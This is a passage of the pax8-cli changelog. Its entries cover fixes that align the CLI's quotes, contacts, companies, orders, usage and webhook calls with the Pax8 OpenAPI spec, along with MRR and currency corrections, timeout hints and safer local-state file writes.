  **Breaking-feeling change for some users:** monthly-cost aggregates will drop for any partner whose portfolio includes `One-Time`, `Trial`, or `Activation` line items. The pre-fix code returned `price × quantity` (gross) for these terms, which inflated every "monthly Pax8 cost" and "potential uplift" figure that aggregates `subscriptionMrr()`. These terms are not recurring revenue and now correctly contribute **0** to monthly aggregates. The drop is the _correct_ number — but it is a visible delta day-over-day, so partners reviewing dashboards after upgrade should expect their headline number to reset.

  Specifics:
  1. **`subscriptionMrr()` per-term divisor table.** Replaced the previous switch with a `Record<BillingTerm | "1-Year", number>` divisor table. `Monthly`, `Annual` (and the defensive `"1-Year"` alias used by `commitment.term`), `2-Year`, `3-Year` divide normally; `One-Time`, `Trial`, `Activation` contribute 0. Unknown enum values now contribute 0 and emit a one-shot stderr warning per process per unknown value — a future Pax8 enum addition surfaces instead of silently miscounting.
  2. **`formatCurrency()` honors `currencyCode`.** The previous implementation hard-coded `"$"`, so every EUR / GBP / CAD partner saw their subscriptions, dashboard, top customers, recommendations, and cost-sim output mislabeled as USD. The `subscriptions list` table had a workaround that appended `" EUR"` per row; that suffix is dropped here and the formatter is the single source of truth via `Intl.NumberFormat`. Falls back to a numeric + code-suffix render when ICU rejects a code. `cost sim` now threads the matched current subscription's currency through to output.

  New demo fixtures (`demo-data.ts`) provide regression gates: Coastline's One-Time EUR onboarding fee (zero-MRR + non-USD), Bright Minds' Trial Defender seat (zero-MRR), Acme's GBP Entra ID P2 (non-USD rendering).

  Closes [#465](https://github.com/pax8labs/pax8-cli/issues/465), [#472](https://github.com/pax8labs/pax8-cli/issues/472).

- [#406](https://github.com/pax8labs/pax8-cli/pull/406) [`75591cb`](https://github.com/pax8labs/pax8-cli/commit/75591cb57b4b8cda6ada2cddde179c53890719e6) Thanks [@jidulberger](https://github.com/jidulberger)! - Align the `QuoteSchema` Zod parser with the v2 quoting API's nested `client` object so `pax8 quotes list` / `quotes show` return a usable `companyId` against the real API. Closes [#384](https://github.com/pax8labs/pax8-cli/issues/384) (block-launch finding from `docs/triage/partner-readiness-audit/01-api-conformity-reads.md`).

  Pre-fix, `GET /v2/quotes` returned `{ client: { id, isShadowCompany, name } }` per `quoting-endpoints.json → components.schemas.QuoteResponse`, but `QuoteSchema` expected a flat `companyId: z.string()`. Zod's default behavior dropped the unknown `client` key, leaving `companyId` undefined on every parsed row when run against the real API. Demo mode masked this because the demo `Quote` fixture carried a flat `companyId` directly.

  `QuoteSchema` now `preprocess`es the wire payload to flatten `client.id → companyId` and surfaces `client.name` / `client.isShadowCompany` as flat optional `clientName` / `clientIsShadow` aliases. Demo data (`packages/core/src/mock/demo-data.ts`) now emits the spec's nested `client: {...}` shape and the `MockPax8Client` routes quote reads through `QuoteSchema.parse` — so the demo path exercises the same flattening as the real wire and demo mode stops masking the bug. The legacy flat shape (used by the `QuotesApi` unit-test fixtures) still parses cleanly because the preprocess passes through unchanged when no nested `client` is present.

- [#499](https://github.com/pax8labs/pax8-cli/pull/499) [`99ff0a2`](https://github.com/pax8labs/pax8-cli/commit/99ff0a2a78b63998ca05c8fded9b41b885bdb0d3) Thanks [@jidulberger](https://github.com/jidulberger)! - Four interlocking fixes to local-state files written by the CLI:
  1. **`PAX8_CONFIG_DIR` routing.** `idempotency.ts`, `dispute.ts`, the REPL pending-actions reader/writer in `repl.ts`, the writers in `companies/list.ts` and `recommendations/list.ts`, and the `init` command's error recovery text all hardcoded `path.join(homedir(), ".pax8")` (or read it via a dynamic `await import("os")` to dodge top-level greps). They now go through `getConfigDir()`, which honors `PAX8_CONFIG_DIR` and stays in sync between readers and writers. The `init` recovery hint renders the resolved path and tells the user how to point at a different root.
  2. **Safe-write `0o600` + `O_NOFOLLOW`.** `last-list.ts`, the REPL `pending-actions.json` writes, the tmp-file step in `dispute.ts` and `idempotency.ts`, and `mock-client.ts`'s `demo-orders.json` writes all wrote via `fs.writeFile` / `writeFileSync`. Under the default umask this left partner-tenant business data world-readable on shared hosts and would follow an attacker-placed symlink at the destination. They now go through `safeWriteFileSync`.
  3. **Repo-wide policy gate (`local-state-writers.test.ts`).** A vitest regression test enforces both rules across `packages/cli/src/` — no direct `os.homedir()`, no raw `writeFileSync` / `fs.writeFile` outside an explicit allow-list. Future state-file additions can't slip past.
  4. **Test hermeticity.** `loader-extended.test.ts` previously created `~/.pax8` on the contributor's real home while exercising the default-path code path; it now stubs `os.homedir()` to a tmpdir per test. New `vitest.real-home-guard-setup.ts` snapshots `~/.pax8` before tests run and asserts the post-suite filesystem is unchanged — any test that mutates the real home now fails CI explicitly. This guard caught a pre-existing bug in `MockPax8Client.OrdersResource` (writes to `~/.pax8/demo-orders.json` ignored `PAX8_CONFIG_DIR`), fixed in this PR.

  **Behavioral note:** demo-mode `demo-orders.json` now lives at `${PAX8_CONFIG_DIR}/demo-orders.json` instead of `~/.pax8/demo-orders.json`. Existing users with persisted demo state under `~/.pax8` will appear to have a fresh demo on first run after upgrade.

  Follow-up tracked in [#504](https://github.com/pax8labs/pax8-cli/issues/504): `credential-store.ts` has the same architectural defect; its unit tests mock `fs.*` so the home-guard doesn't see the leak, but the fix belongs alongside this batch.

  Closes [#458](https://github.com/pax8labs/pax8-cli/issues/458), [#469](https://github.com/pax8labs/pax8-cli/issues/469), [#475](https://github.com/pax8labs/pax8-cli/issues/475), [#459](https://github.com/pax8labs/pax8-cli/issues/459).

### Minor Changes

- [#353](https://github.com/pax8labs/pax8-cli/pull/353) [`5faf8a3`](https://github.com/pax8labs/pax8-cli/commit/5faf8a3b91688651afd1a12097c89e28ce65a20a) Thanks [@jidulberger](https://github.com/jidulberger)! - `pax8 contacts {create,update}`: align request bodies with the public OpenAPI contract.
  - `types` is now `Array<{type, primary}>` per the spec's `ContactType` object schema (was `string[]` of kind enums). The `--type` CLI flag still accepts comma-separated kind names (`Admin,Billing,Technical`); each entry is inflated to `{type, primary: false}` at handler time.
  - `--phone` is now required on `contacts create` — the spec marks it required, and a spec-strict server 422s without it.
  - `contacts update` now fetch-then-merges the current contact before sending so the spec's PUT body invariants (`firstName`, `lastName`, `email`, `phone` all required) are satisfied even when the user passes a single field.
  - `companyId` is no longer carried in the request body — the spec puts it in the URL path (`/v1/companies/{companyId}/contacts[/{contactId}]`) only.

  A new `ContactTypeKind` type (the bare `"Admin"|"Billing"|"Technical"` enum) is exported from `@pax8/core` alongside the reshaped `ContactType` object type, so embedded consumers can keep validating kind names independently of the wire shape.

  Closes [#325](https://github.com/pax8labs/pax8-cli/issues/325).

### Patch Changes

- [#352](https://github.com/pax8labs/pax8-cli/pull/352) [`a6cea7f`](https://github.com/pax8labs/pax8-cli/commit/a6cea7fea15bbe63efa9aaf2223737057c44f6d9) Thanks [@jidulberger](https://github.com/jidulberger)! - `pax8 companies create` and `pax8 companies show` (and every other read that surfaces `address`) now align with the public Pax8 spec:
  - **`AddressSchema` rename (closes [#327](https://github.com/pax8labs/pax8-cli/issues/327), [#328](https://github.com/pax8labs/pax8-cli/issues/328)):** wire field names are now `stateOrProvince` and `postalCode` (previously `state` and `zip`). The CLI flag names `--state` and `--zip` are unchanged for UX continuity — flag vocabulary and wire vocabulary are intentionally separate. Pre-rename, the wrong leaf names silently (a) dropped state/postal data on `companies create` (the API didn't recognize them) and (b) dropped state/postal data on every read (Zod stripped the API's `stateOrProvince` / `postalCode` as unknowns).
  - **Three required billing booleans (closes [#329](https://github.com/pax8labs/pax8-cli/issues/329)):** `companies create` now sends `billOnBehalfOfEnabled`, `selfServiceAllowed`, and `orderApprovalRequired` via new `--bill-on-behalf-of`, `--self-service-allowed`, `--order-approval-required` flags (all default to `false`, matching the conservative shape in the OpenAPI `company-post` example). `CreateCompanyInputSchema` now requires the three booleans at the type level.
  - **Fail-fast on empty address (closes [#329](https://github.com/pax8labs/pax8-cli/issues/329)):** the handler no longer constructs a degenerate empty `address` object on the wire when partners omit address flags. It throws `ERROR_INVALID_INPUT` with a structured error pointing at the spec's `address` requirement.
  - **New `--street` flag** on `companies create` for the spec's `address.street`.

  Demo fixtures and the mock client are renamed to match. Read-side rendering in `companies show` now reads from `address.stateOrProvince` and `address.postalCode`.

- [#346](https://github.com/pax8labs/pax8-cli/pull/346) [`758eb98`](https://github.com/pax8labs/pax8-cli/commit/758eb98ed058e53a8961defb7492ecf710ebb6f2) Thanks [@jidulberger](https://github.com/jidulberger)! - `CompaniesApi.update` now uses PATCH instead of PUT to match the public OpenAPI contract. The public spec documents only `get` and `patch` on `/companies/{companyId}` — PUT is undocumented and would either 405 or rely on legacy aliasing. The CLI's partial-body approach is unchanged (it was always correct for PATCH semantics); only the verb on the wire moves. `pax8 companies update` UX is unaffected.

- [#350](https://github.com/pax8labs/pax8-cli/pull/350) [`8108ea0`](https://github.com/pax8labs/pax8-cli/commit/8108ea096d2ea82d24fc4cbb8f374952976fe9be) Thanks [@jidulberger](https://github.com/jidulberger)! - Fix: `pax8 contacts` commands now target the documented nested API paths under `/v1/companies/{companyId}/contacts/*`. Previously `ContactsApi.{get,create,update,delete}` called flat `/v1/contacts/*` endpoints that do not exist in the Pax8 public spec; the public OpenAPI definition only addresses contacts via `/v1/companies/{companyId}/contacts[/{contactId}]`.

  **Breaking change at the CLI surface** for `contacts show`, `contacts update`, and `contacts delete`: each now requires `--company <id|name>` because the spec has no flat per-contact lookup. The CLI emits a clear migration error when `--company` is missing. `contacts list` and `contacts create` already required `--company`, so their surface is unchanged. Body-shape bugs surfaced in the same audit ([#325](https://github.com/pax8labs/pax8-cli/issues/325)) are intentionally out of scope for this PR.

  Closes [#324](https://github.com/pax8labs/pax8-cli/issues/324).

- [#341](https://github.com/pax8labs/pax8-cli/pull/341) [`87dd835`](https://github.com/pax8labs/pax8-cli/commit/87dd8350cf2ec89232bd527d6284421cc05dcaf1) Thanks [@jidulberger](https://github.com/jidulberger)! - Add wire-level integration test harness ([#308](https://github.com/pax8labs/pax8-cli/issues/308)) that hits the real Pax8 API and asserts every CLI call resolves to the URL documented by the relevant OpenAPI spec. Runs via `pnpm test:integration` and skips cleanly when `PAX8_CLIENT_ID` / `PAX8_CLIENT_SECRET` are absent — the default `pnpm test` never depends on credentials. Seed coverage hits one v1 resource (`companies list`) and one v2 resource (`quotes list`), proving both routing surfaces work against the real API.

  This closes the structural test gap that allowed the [#307](https://github.com/pax8labs/pax8-cli/issues/307) quotes `v1`/`v2` regression to ship: unit tests mocked the client and only asserted relative paths; subprocess tests ran in demo mode against `MockPax8Client`. The new harness is the missing wire-level layer, with a documented extension pattern (`e2e/integration/harness.ts`, `CONTRIBUTING.md`) so any new API surface plugs in with one read-only smoke test. The harness unblocks the held quotes-v2 body-shape fixes ([#311](https://github.com/pax8labs/pax8-cli/issues/311)–[#314](https://github.com/pax8labs/pax8-cli/issues/314) and the parallel audit's [#323](https://github.com/pax8labs/pax8-cli/issues/323)/[#325](https://github.com/pax8labs/pax8-cli/issues/325)/[#326](https://github.com/pax8labs/pax8-cli/issues/326)/[#327](https://github.com/pax8labs/pax8-cli/issues/327)/[#328](https://github.com/pax8labs/pax8-cli/issues/328)/[#329](https://github.com/pax8labs/pax8-cli/issues/329)/[#331](https://github.com/pax8labs/pax8-cli/issues/331)/[#332](https://github.com/pax8labs/pax8-cli/issues/332)).

  `@pax8/core` change: `Pax8Client` debug mode now also emits the resolved absolute URL alongside the existing relative-path log line, e.g. `[pax8] GET url=https://api.pax8.com/v2/quotes?page=0&size=50`. This is what the integration harness parses to verify version routing. Query strings carry no bearer tokens.

- [#348](https://github.com/pax8labs/pax8-cli/pull/348) [`d3d8316`](https://github.com/pax8labs/pax8-cli/commit/d3d8316998343e11d3c0057bb44add7cbeff55e7) Thanks [@jidulberger](https://github.com/jidulberger)! - Fix: `pax8 orders create` and `pax8 recommendations act` now populate the spec-required `lineItemNumber` field on every outgoing line item. The public Pax8 OpenAPI's `CreateLineItem` schema declares `lineItemNumber` as required (it's a 1-based reference used by `parentLineItemNumber` to express child line items within the same order), but the CLI was omitting it entirely — every `POST /orders` payload was violating the published contract.

  The fix lives in `@pax8/core`'s `OrdersApi.create()`: it auto-injects `lineItemNumber = idx + 1` on any line item that doesn't supply one, so existing embedded consumers don't have to think about the field. `OrderLineItemInputSchema` (the wire shape) now requires `lineItemNumber`; a new `OrderLineItemCreateInput` type exposes it as optional for callers, with the auto-fill happening at the boundary. Closes [#331](https://github.com/pax8labs/pax8-cli/issues/331).

  Spec ambiguity: the spec's canonical example (`microsoft-office-365-e3-order`) omits `lineItemNumber` even though the schema marks it required. Matching the schema is safer than matching the example — if the real API tolerates omission today, this fix is still correct (and defensive against future enforcement); if it doesn't, this unblocks single- and multi-line orders.

- [#365](https://github.com/pax8labs/pax8-cli/pull/365) [`828444e`](https://github.com/pax8labs/pax8-cli/commit/828444e5669e1f05a674fafec8ea72428ff3f9a1) Thanks [@jidulberger](https://github.com/jidulberger)! - Surface an actionable hint when `pax8 orders list` (or any command) hits the 30s default HTTP timeout, and make the timeout configurable via `PAX8_TIMEOUT_MS` ([#199](https://github.com/pax8labs/pax8-cli/issues/199)).

  Before: the AbortController-driven timeout threw an `ApiError(status=0, "Request timed out after 30000ms")` that classified as `ERROR_INTERNAL` and rendered as a bare millisecond count. Partners with large portfolios who hit slow `/orders` responses had no signal as to what to try next.

  After:
  - `ERROR_API_TIMEOUT` now covers both server-side 408s and client-side AbortController timeouts. The CLI's `--json` error envelope always carries the code; the human-facing render carries recovery steps.
  - The generic recovery hint suggests retrying, extending the per-request timeout via `PAX8_TIMEOUT_MS=<ms>` (capped at 300000), and running `pax8 doctor`.
  - `pax8 orders list` adds a command-specific layer on top: try a smaller `--size`, narrow with `--company <name>`. The generic env-var escape hatch is concatenated as the floor so it's never crowded out.
  - `PAX8_TIMEOUT_MS` is wired through `getDefaultTimeout()` and applied to every `Pax8Client` request when no explicit `timeout` option is passed. The default (30000ms) and retry behavior are unchanged.
  - New exports from `@pax8/core`: `getDefaultTimeout`, `isApiTimeoutError` — the canonical predicate the CLI's error layer uses to route abort-path timeouts to `ERROR_API_TIMEOUT`. Embedders that want the same hint UX can reuse the predicate.

- [#351](https://github.com/pax8labs/pax8-cli/pull/351) [`629011f`](https://github.com/pax8labs/pax8-cli/commit/629011f861cf8c052e9eaea00bc360e0b58b42e1) Thanks [@jidulberger](https://github.com/jidulberger)! - Fix: `OrderLineItemInputSchema.provisioningDetails` (and the wire-read `OrderLineItemSchema.provisioningDetails`) reshaped from `Record<string, unknown>` to `Array<{key: string, values: string[]}>` to match the public Pax8 OpenAPI spec's `ProvisioningDetail` schema. No CLI command was populating this field at the time of the fix, so no live traffic was breaking — but the wrong shape was baked into the Zod input contract and would have produced unparseable bodies for any future provisioning-aware feature.

  The new shape is exposed as `OrderLineItemProvisioningDetailSchema` (single entry) and `OrderLineItemProvisioningSchema` (array). The product-side `ProvisioningDetailSchema` (which describes a _product's_ provisioning requirements, not an order line's _values_) is unchanged.

  `pax8 orders create` gains a `provisioning=<key>:<value>[|<value>...]` syntax inside `--line-item`, repeatable for multiple keys: `--line-item product=<id>,quantity=5,provisioning=domain:contoso.com,provisioning=region:us-east|us-west`. The mock client echoes `provisioningDetails` back on dry-run responses so subprocess tests can pin the wire shape. Closes [#332](https://github.com/pax8labs/pax8-cli/issues/332).

- [#340](https://github.com/pax8labs/pax8-cli/pull/340) [`1dcf2d9`](https://github.com/pax8labs/pax8-cli/commit/1dcf2d9beb25cb78bd39b2be184111aa189225a3) Thanks [@jidulberger](https://github.com/jidulberger)! - Add a per-API base URL mechanism to `Pax8Client`. Each API class can now opt into a different base URL than the project-wide default by registering a key in `apiBaseOverrides` at construction time and passing `{ api: "<key>" }` in `RequestOpts`. This unblocks APIs that live on a different prefix entirely (e.g. Webhooks at `https://api.pax8.com/api/v2/...` — the per-call `apiVersion` substitution from [#316](https://github.com/pax8labs/pax8-cli/issues/316) can swap version segments but cannot represent a different prefix).

  Three composition dimensions now compose cleanly:
  1. **Project-wide default** — `https://api.pax8.com/v1` (today's `FALLBACK_BASE_URL`); overridable via `PAX8_API_BASE` for staging.
  2. **Per-API override** — registered in `apiBaseOverrides`, opt-in per call via `RequestOpts.api`. Unaffected by `PAX8_API_BASE` so the staging-redirect pattern continues to work for the default base.
  3. **Per-call version segment** — existing `RequestOpts.apiVersion` from [#316](https://github.com/pax8labs/pax8-cli/issues/316); applies on top of whichever base was selected.

  No wire behavior changes today for any existing API class. `QuotesApi` continues to use the per-call `apiVersion: "v2"` mechanism unchanged. `WebhooksApi` adoption ships separately under [#322](https://github.com/pax8labs/pax8-cli/issues/322).

- [#345](https://github.com/pax8labs/pax8-cli/pull/345) [`e307132`](https://github.com/pax8labs/pax8-cli/commit/e3071321aaf0dd6a4a36bbe76882b8ccd47f28f4) Thanks [@jidulberger](https://github.com/jidulberger)! - Fix: `pax8 quotes create` now sends the v2-spec body shape (`{ clientId, quoteRequestId? }`) instead of the pre-v2 `{ companyId, lineItems[] }`. Per the public quoting OpenAPI spec (v2.0.0), `POST /v2/quotes` accepts only `clientId` (required) plus an optional `quoteRequestId` — line items are added through a separate `POST /v2/quotes/{quoteId}/line-items` call after the quote exists. The previous body would have produced a 4xx body-shape error against the real API ([#311](https://github.com/pax8labs/pax8-cli/issues/311); see `docs/triage/quotes-api-version.md` §9.1).

  Behavior changes:
  - `--product` is now **optional** on `quotes create`. Without it, the command creates an empty draft quote (the natural shape for the v2 surface). This closes the shorthand-vs-canonical decision from [#305](https://github.com/pax8labs/pax8-cli/issues/305) — empty quote is the canonical path, two-call shorthand is a convenience for the common single-line case.
  - When `--product` is supplied, the command orchestrates two wire calls: `POST /v2/quotes` to create the empty quote, then `POST /v2/quotes/{id}/line-items` to append the line. If the line-item POST fails after the create succeeds, the new quote ID is surfaced prominently with a recovery hint (`pax8 quotes line-items add <id> --product X --quantity N`) so the user can retry the add manually instead of losing the quote.
  - `CreateQuoteInputSchema` is renamed: `companyId` → `clientId`. The `lineItems` array is removed from the create input entirely.

  Scope: `quotes create` only. The remaining body-shape issues on `quotes update` ([#313](https://github.com/pax8labs/pax8-cli/issues/313)), `quotes send` ([#314](https://github.com/pax8labs/pax8-cli/issues/314)), and `quotes line-items add` ([#312](https://github.com/pax8labs/pax8-cli/issues/312)) are tracked separately under the `quotes-v2-body-shape` label.

- [#359](https://github.com/pax8labs/pax8-cli/pull/359) [`41c13e6`](https://github.com/pax8labs/pax8-cli/commit/41c13e6677b5781236c2ba21bde56d4464d40057) Thanks [@jidulberger](https://github.com/jidulberger)! - Refactor: `OrderLineItemProvisioningDetailSchema` / `OrderLineItemProvisioningSchema` renamed to `LineItemProvisioningDetailSchema` / `LineItemProvisioningSchema` (and the type alias `OrderLineItemProvisioningDetail` to `LineItemProvisioningDetail`). The `Order` prefix was misleading once the schemas became shared across line-item domains — the public quoting OpenAPI spec's `AddStandardLineItemPayload.provisioningDetails` carries the same `Array<{key, values: string[]}>` shape as the orders side ([#332](https://github.com/pax8labs/pax8-cli/issues/332)).

  Backward-compatible: the pre-[#356](https://github.com/pax8labs/pax8-cli/issues/356) export names remain exported from `@pax8/core` as aliases that resolve to the same schema instances. Embedders that imported `OrderLineItemProvisioning*` continue to work unchanged; new code should prefer `LineItemProvisioning*`.

  No wire-shape change. No CLI flag change. The quotes-side line-item path (`POST /v2/quotes/{id}/line-items` via `AddQuoteLineItemInputSchema`) doesn't currently surface `provisioningDetails`, and [#356](https://github.com/pax8labs/pax8-cli/issues/356) doesn't add it — when a future PR adds a `--provisioning` flag for `quotes line-items add`, the field can reuse `LineItemProvisioningSchema.optional()` directly. Closes [#356](https://github.com/pax8labs/pax8-cli/issues/356).

- [#342](https://github.com/pax8labs/pax8-cli/pull/342) [`db00533`](https://github.com/pax8labs/pax8-cli/commit/db005336a163b6028d7d75a5628d6a9f0d824278) Thanks [@jidulberger](https://github.com/jidulberger)! - Fix: `pax8 quotes line-items add` now sends the `effectiveDate` and `price` fields that the v2 `POST /v2/quotes/{quoteId}/line-items` Standard payload requires. Before this fix the call had the right URL (post-[#316](https://github.com/pax8labs/pax8-cli/issues/316)) but a 4xx-eliciting body — the v2 `AddStandardLineItemPayload` schema marks both fields required, and the CLI sent neither.

  `effectiveDate` defaults to today (UTC), normalized to ISO 8601 (`YYYY-MM-DDT00:00:00Z`); `price` defaults to the product's list price (`suggestedRetailPrice`) for the chosen billing term, resolved via `products getPricing` and cached per command run. Both are overridable via new flags: `--effective-date <YYYY-MM-DD>` (strict format) and `--price <number>` (non-negative). The Standard payload is the only shape exposed — Custom and UsageBased remain out of scope (separate scope decision per [#310](https://github.com/pax8labs/pax8-cli/issues/310)).

  Schema change: `AddQuoteLineItemInputSchema` in `@pax8/core` now requires `effectiveDate: z.string()` and `price: z.number()`. Downstream callers constructing `AddQuoteLineItemInput` directly must supply both.

  Closes [#312](https://github.com/pax8labs/pax8-cli/issues/312).

- [#354](https://github.com/pax8labs/pax8-cli/pull/354) [`18e2e1f`](https://github.com/pax8labs/pax8-cli/commit/18e2e1f3e64e110be3d470e736c60941555aa1a8) Thanks [@jidulberger](https://github.com/jidulberger)! - Fix: `pax8 quotes update` and `pax8 quotes send` now send the v2-spec body shape on `PUT /v2/quotes/{id}`. Per the public quoting OpenAPI spec (v2.0.0), every PUT on that endpoint requires all five mutable fields (`expiresOn`, `introMessage`, `published`, `status`, `termsAndDisclaimers`) — there is no partial PUT and no separate status-transition endpoint. The previous bodies (`{ lineItems?, expiresOn? }` for `update`; `{ status }` for `send`/`setStatus`) would have produced 4xx body-shape errors against the real API ([#313](https://github.com/pax8labs/pax8-cli/issues/313), [#314](https://github.com/pax8labs/pax8-cli/issues/314); see `docs/triage/quotes-api-version.md` §9.1).

  Behavior changes:
  - `QuotesApi.update(id, overrides)` now does fetch-then-merge internally: it GETs the current quote, projects (current + overrides) through a shared `buildFullUpdatePayload` helper, then PUTs the full 5-field body. Callers see a partial-override interface (`{ expiresOn?, introMessage?, published?, status?, termsAndDisclaimers? }`) and don't need to think about the server-side contract.
  - `QuotesApi.setStatus(id, status)` and `QuotesApi.send(id)` ride the same fetch-then-merge path — status transitions go through `update({ status })`, not a status-only PUT body.
  - `UpdateQuoteInputSchema` is rewritten: `lineItems` is removed entirely (the v2 PUT does not accept it); `expiresOn`, `introMessage`, `published`, `status`, and `termsAndDisclaimers` are added as optional overrides.
  - `QuoteSchema` adds `introMessage` and `termsAndDisclaimers` as required strings — both must round-trip through the read shape so fetch-then-merge can preserve them on writes.
  - `pax8 quotes update --expiration-date YYYY-MM-DD` now normalizes the user-friendly date to ISO 8601 midnight-UTC (`YYYY-MM-DDT00:00:00Z`) before sending, matching the v2 spec's `date-time` typing. A new shared `normalizeIsoDate(raw, flagName)` helper is factored out from the existing `resolveEffectiveDate` so both `--expiration-date` and `--effective-date` get the same parse-and-validate behavior with flag-specific error messages.
  - `pax8 quotes update --product` no longer relies on the top-level PUT to replace line items (the v2 surface doesn't accept it). The CLI decomposes the request into per-line `DELETE /v2/quotes/{id}/line-items/{lineItemId}` calls for existing items plus a fresh `POST /v2/quotes/{id}/line-items` for the new one — reusing the `resolveListPrice` / `resolveEffectiveDate` helpers that `quotes create` and `quotes line-items add` already share. Partial-failure between the delete and the add is surfaced with a clear `pax8 quotes line-items add ...` recovery hint, mirroring the pattern from `quotes create` ([#311](https://github.com/pax8labs/pax8-cli/issues/311)).

  Out of scope: `--intro-message` / `--terms-and-disclaimers` / `--status` are not exposed as CLI flags — those fields aren't user-settable today, and the fetch-then-merge preserves the server-side values transparently. Exposing them is a separate enhancement.

  Closes [#313](https://github.com/pax8labs/pax8-cli/issues/313) and [#314](https://github.com/pax8labs/pax8-cli/issues/314). The remaining body-shape audit row (`POST /v2/quotes/{id}/line-items` add, [#312](https://github.com/pax8labs/pax8-cli/issues/312)) was resolved earlier; with this patch the entire `quotes-v2-body-shape` label is empty.

- [#316](https://github.com/pax8labs/pax8-cli/pull/316) [`3b9026b`](https://github.com/pax8labs/pax8-cli/commit/3b9026ba3b56cf6b2f331b4aa5982d6631dfd6b0) Thanks [@jidulberger](https://github.com/jidulberger)! - Fix: `pax8 quotes` and `pax8 quotes line-items` commands now hit the correct v2 wire path. Previously every quote request resolved to `https://api.pax8.com/v1/quotes/...`, which the public Pax8 API does not document — quotes live only at `/v2/quotes/...` per the quoting OpenAPI spec (v2.0.0). The CLI's quote commands returned 404 against the real API.

  Wire path only: this hotfix routes the requests to the right URL. Five read operations (`quotes list/show/delete`, `quotes line-items list/remove`) now work end-to-end against the real v2 API. Five write operations (`quotes create/update/send`, `quotes line-items add`) still fail until follow-up body-shape fixes land — but they now fail visibly with 4xx body-shape errors instead of silent 404s. The body-shape work is tracked under the `quotes-v2-body-shape` label and held until integration test coverage exists ([#308](https://github.com/pax8labs/pax8-cli/issues/308)). See `docs/triage/quotes-api-version.md` for the full audit, including the retrospective on why the initial wire-path audit didn't catch the body-shape problems.

  `Pax8Client` gains a `RequestOpts` per-call parameter on `get`/`post`/`put`/`patch`/`delete`/`getPaginated`, currently used only to opt into a non-default API version (`{ apiVersion: "v2" }`). Other API classes are unchanged and continue to inherit the default `/v1` from the shared base URL.

- [#347](https://github.com/pax8labs/pax8-cli/pull/347) [`cc7b004`](https://github.com/pax8labs/pax8-cli/commit/cc7b0046e6d87173d554c54b9e2f32e0c1b4ac5e) Thanks [@jidulberger](https://github.com/jidulberger)! - Fix: `pax8 subscriptions cancel --cancel-date` now sends the `cancelDate` query parameter as RFC 3339 / ISO 8601 `date-time` (`YYYY-MM-DDT00:00:00Z`) to match the Pax8 OpenAPI spec, which types the parameter as `format: date-time`. Previously the CLI sent the date-only form `YYYY-MM-DD` — most APIs accept that leniently, but the contract mismatch was unverified and would have surprised partners reading the spec.

  User-facing behavior is unchanged: the `--cancel-date` flag still accepts (and only accepts) the simple `YYYY-MM-DD` form, and `--json` output still emits `cancelDate` as `YYYY-MM-DD`. The normalization happens inside `SubscriptionsApi.delete()` just before the wire call, mirroring the defensive `effectiveDate` normalization landed for `quotes line-items add` in [#312](https://github.com/pax8labs/pax8-cli/issues/312). Closes [#333](https://github.com/pax8labs/pax8-cli/issues/333).

- [#343](https://github.com/pax8labs/pax8-cli/pull/343) [`aaa56e1`](https://github.com/pax8labs/pax8-cli/commit/aaa56e12355abf8d247346b5d1f4e70ab1af3192) Thanks [@jidulberger](https://github.com/jidulberger)! - Fix: `pax8 usage list` and `pax8 usage show --lines` now hit the wire paths the Pax8 public spec actually documents. Previously `UsageApi.listSummaries` called a flat `GET /v1/usage-summaries` endpoint that does not exist (the spec only exposes the nested `GET /v1/subscriptions/{subscriptionId}/usage-summaries`), and `UsageApi.listLines` called `/v1/usage-summaries/{id}/lines` instead of the documented `/v1/usage-summaries/{id}/usage-lines`. Both bugs surfaced as 404s against the real Pax8 API.

  `UsageApi.listSummaries(subscriptionId, params)` now requires a subscription ID. At the CLI surface the change is backward-compatible: `pax8 usage list --company <id|name>` continues to work and now resolves to the company's subscriptions, then iterates over each subscription's nested usage-summaries endpoint. A new `--subscription <id>` flag is available as the direct path for callers that already have a subscription ID. The `UsageSummary` schema gains an optional `subscriptionId` field, populated in demo data so the agent-facing output exposes the link from summary back to subscription.

  Closes [#337](https://github.com/pax8labs/pax8-cli/issues/337). Closes [#212](https://github.com/pax8labs/pax8-cli/issues/212) transitively.

- [#344](https://github.com/pax8labs/pax8-cli/pull/344) [`e507f77`](https://github.com/pax8labs/pax8-cli/commit/e507f7702b1b9e281534ef396d91fc61cca87ede) Thanks [@jidulberger](https://github.com/jidulberger)! - Fix every webhook call to land at `https://api.pax8.com/api/v2/webhooks/...` per the public webhooks OpenAPI spec. Previously every webhook call resolved to `https://api.pax8.com/v1/webhooks/...`, which the spec does not document — six write operations (`create`, `updateConfiguration`, `setStatus`, `delete`, `test`/`testTopic`, `retryLog`) plus every webhook read were either 404ing or hitting a legacy alias whose behavior is unverified.

  `WebhooksApi` now threads `{ api: "webhooks" }` on every request, opting into the per-API base URL mechanism added in [#321](https://github.com/pax8labs/pax8-cli/issues/321). The CLI's `Pax8Client` construction (`packages/cli/src/lib/context.ts`) registers `webhooks → https://api.pax8.com/api/v2` in `apiBaseOverrides`; embedded `@pax8/core` consumers who construct their own client need to add the same entry to route webhook calls correctly. Relative paths inside `WebhooksApi` are unchanged (`/webhooks`, `/webhooks/{id}/status`, etc.) — they were already correct per the spec.

  Also removes two dead helpers (`WebhooksApi.update`, `WebhooksApi.updateStatus`) and the `UpdateWebhookInputSchema` they used. Both targeted endpoints the spec does not document (`PUT /webhooks/{id}`, `PATCH /webhooks/{id}`) and would 404 against the real API. The CLI's `pax8 webhooks update` command was already using `updateConfiguration` instead, so no command-surface changes.

  Body shapes for the write endpoints are tracked separately under [#323](https://github.com/pax8labs/pax8-cli/issues/323) and are intentionally not addressed in this hotfix — this is wire-path only.

- [#349](https://github.com/pax8labs/pax8-cli/pull/349) [`e179b35`](https://github.com/pax8labs/pax8-cli/commit/e179b35b9ea4fe0bfd5cad4339ca183e5666c6c2) Thanks [@jidulberger](https://github.com/jidulberger)! - `pax8 webhooks create`: align the request body with the public Pax8 webhooks v2 OpenAPI contract. The CLI now sends `{ url, displayName, webhookTopics: [{ topic, filters }] }` instead of the pre-[#323](https://github.com/pax8labs/pax8-cli/issues/323) `{ url, topics: string[] }`. A spec-strict server would 422 on the old shape (missing required `displayName`; wrong key name and element shape for the topic list).
  - Adds a required `--display-name <name>` flag to `pax8 webhooks create`. Help text explains why: the Pax8 API requires it.
  - Keeps the user-facing `--topics T1,T2` flag unchanged so partner scripts continue to work; the CLI transforms it into the structured `webhookTopics: [{ topic, filters: [] }]` shape at the wire layer.
  - `--events` continues to work as a deprecated alias for `--topics`.

